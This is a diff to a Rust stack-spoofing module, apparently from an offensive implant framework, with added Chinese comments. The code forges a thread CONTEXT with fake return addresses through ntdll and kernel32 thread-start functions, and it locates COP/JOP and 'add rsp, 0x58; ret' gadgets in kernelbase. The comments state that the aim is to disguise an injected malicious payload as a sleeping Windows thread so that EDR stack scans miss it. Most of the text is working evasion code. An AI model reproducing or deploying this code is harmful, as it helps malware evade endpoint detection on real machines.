@@ -200,15 +200,19 @@ impl StackSpoof {
             .function_by_offset(cfg.rtl_acquire_lock.as_u64() as u32 - cfg.modules.ntdll.as_u64() as u32)
             .context(s!("missing unwind: RtlAcquireSRWLockExclusive"))?;
 
+        //ntdll!RtlUserThreadStart：作为所有线程的法定始祖负责初始化 SEH环境，通过计算其栈深来确立伪造栈的物理最底层原点，从而在 EDR溯源审计时为载荷提供“根正苗红”的合法身份证明
         self.rtl_user_thread_size = ignoring_set_fpreg(cfg.modules.ntdll.as_ptr(), rtl_user)
             .context(s!("failed to get frame size: RtlUserThreadStart"))?;
 
+        // kernel32!BaseThreadInitThunk：作为启动链中转站负责接收内核参数并拉起用户代码，测量其精确栈帧是为了在内存中锚定指向始祖函数的返回地址偏移，从而还原出逻辑连贯、无断层的系统标准调用序列
         self.base_thread_size = ignoring_set_fpreg(cfg.modules.kernel32.as_ptr(), base_thread)
             .context(s!("failed to get frame size: BaseThreadInitThunk"))?;
 
+         // kernel32!EnumDateFormatsExA：作为处理本地化日期的业务 API通过回调机制执行代码，测定其栈深是为了在混淆链跳转时提供精准的 RSp对齐参数，使恶意动作看起来像是该合法业务函数触发的一次正常回调返回
         self.enum_date_size = ignoring_set_fpreg(cfg.modules.kernel32.as_ptr(), enum_date)
             .context(s!("failed to get frame size: EnumDateFormatsExA"))?;
 
+       // ntdll!RtlAcquireSRWLockExclusive：作为底层同步原语负责获取排他性读写锁，实时提取其栈帧深度是为了在模拟执行停顿行为时提供物理坐标依据，确保掩护混淆逻辑的“正在等锁”假象在内存布局上与系统预期严丝合缝
         self.rlt_acquire_srw_size = ignoring_set_fpreg(cfg.modules.ntdll.as_ptr(), rtl_acquire_srw)
             .context(s!("failed to get frame size: RtlAcquireSRWLockExclusive"))?;
 
@@ -217,6 +221,10 @@ impl StackSpoof {
 
     /// Constructs a forged `CONTEXT` structure simulating a spoofed call chain.
     ///
+    /// EDR会定期扫描所有线程的栈,如果正在运行的代码在栈上没有合法的系统函数,会被判定为注入载荷.
+    /// 
+    /// 本函数把当前线程的CONTEXT改造如下调用链,模拟一个正在休眠/标准的windows系统线程
+    /// 
     /// This function emulates a legitimate return sequence through:
     /// - `ZwWaitForWorkViaWorkerFactory`
     /// - `RtlAcquireSRWLockExclusive`  
@@ -227,25 +235,36 @@ impl StackSpoof {
         unsafe {
             // Construct a fake execution context for the current thread,
             // simulating a call stack that chains through spoofed return addresses
-            let mut ctx_spoof = CONTEXT {
+            let mut ctx_spoof = CONTEXT {   
+                // CONTEXT_FULL代表接管当前线程下所有寄存器
                 ContextFlags: CONTEXT_FULL,
                 ..Default::default()
             };
 
             // Set the instruction pointer to the address of ZwWaitForWorkViaWorkerFactory
+            // zw_wait_for_worker通过config指向ntdll!ZwWaitForWorkViaWorkerFactory.这是win线程池在空闲时的待命处.
+            // 赋值给rip,代表下一条指令.此处代表cpu即将从这个合法的函数中返回
             ctx_spoof.Rip = cfg.zw_wait_for_worker.as_u64();
 
             // Compute the spoofed RSP by subtracting all stacked frame sizes and extra alignment
+            // 栈顶下移5个0x1000(4kb),防止手动写栈时覆盖了原有数据.下移写入之后,和原来栈底之间的空闲空间,系统会怎么处理,留下这么多空白是否有危险?正常的函数调用也会下移大量的栈空间吗?
             ctx_spoof.Rsp = (ctx.Rsp - 0x1000 * 5)
+            // rsp包括其他寄存器在win64下都是64位的
                 - (cfg.stack.rtl_user_thread_size
                     + cfg.stack.base_thread_size
                     + cfg.stack.rlt_acquire_srw_size
                     + 32) as u64;
 
             // Return to RtlAcquireSRWLockExclusive + 0x17 (after call)
+            // cfg.rtl_acquire_lock：指向 ntdll!RtlAcquireSRWLockExclusive
+            // 0x17指该函数内部某条call指令的下一跳指令位置.将该地址写入rsp,代表当ZwWaitForWork执行ret时,会进入这锁函数
+            // 这里为啥是0x17,在spoof.md中
             *(ctx_spoof.Rsp as *mut u64) = cfg.rtl_acquire_lock.as_u64().add(0x17);
 
-            // Return to BaseThreadInitThunk + 0x14
+            // Return to BaseThreadInitThunk + 0x14.模拟BaseThreadInitThunk 调用RtlAcquireSRWLockExclusive 的物理遗痕迹.
+            // // cfg.base_thread：指向 kernel32!BaseThreadInitThunk;rlt_acquire_srw_size:Stack frame size for RtlAcquireSRWLockExclusive
+            // 根据win64下的约定,BaseThreadInitThunk执行ret时,cpu应rsp+rtl_acquire_srw_size位置寻找返回地址
+            // +8:跳过返回地址本身的8字节.0x14,模拟basethread内部调用子函数后的合法返回位置
             *(ctx_spoof.Rsp.add((cfg.stack.rlt_acquire_srw_size + 8) as u64) as *mut u64) =
                 cfg.base_thread.as_u64().add(0x14);
 
@@ -253,7 +272,9 @@ impl StackSpoof {
             *(ctx_spoof.Rsp.add((cfg.stack.rlt_acquire_srw_size + cfg.stack.base_thread_size + 16) as u64)
                 as *mut u64) = cfg.rtl_user_thread.as_u64().add(0x21);
 
-            // End a call stack
+            // End a call stack.伪造调用链在物理空间的终结
+            // 三层伪造寒素的栈深;24代表三层函数的返回地址
+            // 0:win的内存模型中,0/NULL时合法的栈底标志.当os内核/EDR调用RtlVirtualUnwind递归查找父函数时,如果解析出rip在有效模块中会继续回溯,如果解析出的返回地址为0,回溯流程正常终止
            *(ctx_spoof.Rsp.add(
                 (cfg.stack.rlt_acquire_srw_size
                     + cfg.stack.base_thread_size
@@ -268,6 +289,8 @@ impl StackSpoof {
     /// Applies a fake call stack layout to a series of thread contexts,
     /// simulating a legitimate execution.
     pub fn spoof(&self, ctxs: &mut [CONTEXT], cfg: &Config, kind: Obfuscation) -> Result<()> {
+
+        // 得到kernelbase.dll的运行时函数表(image_runtime_function)
         let pe_kernelbase = Unwind::new(PE::parse(cfg.modules.kernelbase.as_ptr()));
         let tables = pe_kernelbase
             .entries()
@@ -275,10 +298,18 @@ impl StackSpoof {
                 "failed to read IMAGE_RUNTIME_FUNCTION entries from .pdata section"
             ))?;
 
-        // Locate the target COP or JOP gadget
+        // Locate the target COP(Call-Oriented Programming) or JOP(Jump-Oriented Programming) gadget:均为绕过DEP(数据执行保护)/ASLR(地址空间随机化)
+        // kernelbase中包含大量以 0xFF 0x13(call [rbx]) 或0xFF 0x23(jmp [rbp])结尾的gadgets
         let (gadget_addr, gadget_size) = self.gadget.resolve(cfg)?;
 
-        // add rsp, 0x58 ; ret
+        // add rsp, 0x58 ; ret:
+        // 在kernelbase模块中,根据runtime_function找到对应的机器码
+        // 0x48(REX.W):扩展前缀,指定接下来的指令操作数为64位
+        // 0x83,0xC4(ADD RSP,imm8):0x83为ADD;0xC4指定目标寄存器RSP
+        // 0x58:要增加的数值0x58(十进制88),这里add跳过指定的0x58空间,从一个深层的系统函数转到另一个函数,在跳转时需要预留32字节影子空间+寄存器(函数通常会备份3-5个寄存器,每个8字节)+16字节的栈对齐.这里是作者通过大量逆向发现,0x58可以一次性跳过大多数系统函数的prolog,让cpu落在预设的下一个返回地址
+        // 0xC3:RET
+        // tables代表一个Image_runtime_function数组
+        // add_rsp_addr代表找到的gadget在内存中的VA;add_rsp_size代表找到的gadget所占栈空间大小
         let (add_rsp_addr, add_rsp_size) = scan_runtime(
             cfg.modules.kernelbase.as_ptr(),
             &[0x48, 0x83, 0xC4, 0x58, 0xC3],
